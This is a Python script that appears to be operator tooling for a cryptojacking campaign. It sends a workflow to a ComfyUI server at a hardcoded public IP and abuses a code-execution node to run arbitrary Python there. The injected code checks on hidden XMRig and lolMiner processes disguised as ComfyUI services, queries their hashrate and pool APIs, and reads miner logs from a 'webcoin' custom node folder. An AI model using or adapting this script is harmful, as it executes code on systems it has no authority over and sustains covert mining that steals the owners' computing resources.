"""Full diagnostic: check processes, local APIs, logs, and dashboard state."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = "http://{}:8188".format(ip)

DIAG_CODE = (
    "import os, subprocess, urllib.request, json\n"
    "lines = []\n"
    "\n"
    "# 1. Check running processes\n"
    "try:\n"
    "    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)\n"
    "    for line in r.stdout.splitlines():\n"
    "        low = line.lower()\n"
    "        if 'comfyui_service' in low or 'comfyui_render' in low or 'xmrig' in low or 'lolminer' in low:\n"
    "            lines.append('PROC: ' + line.strip()[:150])\n"
    "except Exception as e:\n"
    "    lines.append('ps failed: ' + str(e))\n"
    "\n"
    "if not any('PROC:' in l for l in lines):\n"
    "    lines.append('NO MINER PROCESSES FOUND')\n"
    "\n"
    "# 2. Check XMRig API (CPU miner)\n"
    "try:\n"
    "    from core.config import API_TOKEN\n"
    "    req = urllib.request.Request('http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Accept': 'application/json', 'Authorization': 'Bearer ' + API_TOKEN})\n"
    "    with urllib.request.urlopen(req, timeout=5) as resp:\n"
    "        cpu_data = json.loads(resp.read())\n"
    "    hr = cpu_data.get('hashrate', {}).get('total', [0])\n"
    "    pool = cpu_data.get('connection', {}).get('pool', '')\n"
    "    lines.append('CPU API: hashrate=' + str(hr) + ' pool=' + pool)\n"
    "except Exception as e:\n"
    "    lines.append('CPU API FAIL: ' + str(e)[:200])\n"
    "\n"
    "# 3. Check lolMiner API (GPU miner)\n"
    "try:\n"
    "    req = urllib.request.Request('http://127.0.0.1:44882',\n"
    "        headers={'Accept': 'application/json'})\n"
    "    with urllib.request.urlopen(req, timeout=5) as resp:\n"
    "        gpu_data = json.loads(resp.read())\n"
    "    algos = gpu_data.get('Algorithms', [{}])\n"
    "    algo0 = algos[0] if algos else {}\n"
    "    lines.append('GPU API: perf=' + str(algo0.get('Total_Performance', 0)) + ' pool=' + str(algo0.get('Pool', '')))\n"
    "except Exception as e:\n"
    "    lines.append('GPU API FAIL: ' + str(e)[:200])\n"
    "\n"
    "# 4. Check last lines of miner logs\n"
    "cn = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    if hasattr(folder_paths, 'get_folder_paths'):\n"
    "        cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "except:\n"
    "    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes']:\n"
    "        if os.path.isdir(g):\n"
    "            cn = g\n"
    "            break\n"
    "\n"
    "target = os.path.join(cn, 'webcoin') if cn else None\n"
    "\n"
    "for logname in ['bin/service.log', 'bin/render.log']:\n"
    "    lp = os.path.join(target, logname)\n"
    "    if os.path.exists(lp):\n"
    "        sz = os.path.getsize(lp)\n"
    "        with open(lp) as f:\n"
    "            content = f.read()\n"
    "        last_lines = content.strip().splitlines()[-5:]\n"
    "        lines.append(logname + ' (' + str(sz) + 'b):')\n"
    "        for ll in last_lines:\n"
    "            lines.append('  ' + ll[:150])\n"
    "    else:\n"
    "        lines.append(logname + ': NOT FOUND')\n"
    "\n"
    "# 5. Check if dashboard thread is alive\n"
    "import threading\n"
    "thread_names = [t.name for t in threading.enumerate()]\n"
    "lines.append('threads: ' + ', '.join([t for t in thread_names if 'dashboard' in t.lower() or 'enhanced' in t.lower() or 'miner' in t.lower() or 'poll' in t.lower()]))\n"
    "\n"
    "result = chr(10).join(lines)\n"
)

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": DIAG_CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request("{}/prompt".format(base), data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print("prompt_id: {}".format(pid))

for attempt in range(12):
    time.sleep(5)
    try:
        req2 = urllib.request.Request("{}/history/{}".format(base, pid))
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print("Status: {}\n".format(status))
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print("poll error: {}".format(e))
else:
    print("Still pending after 60s")
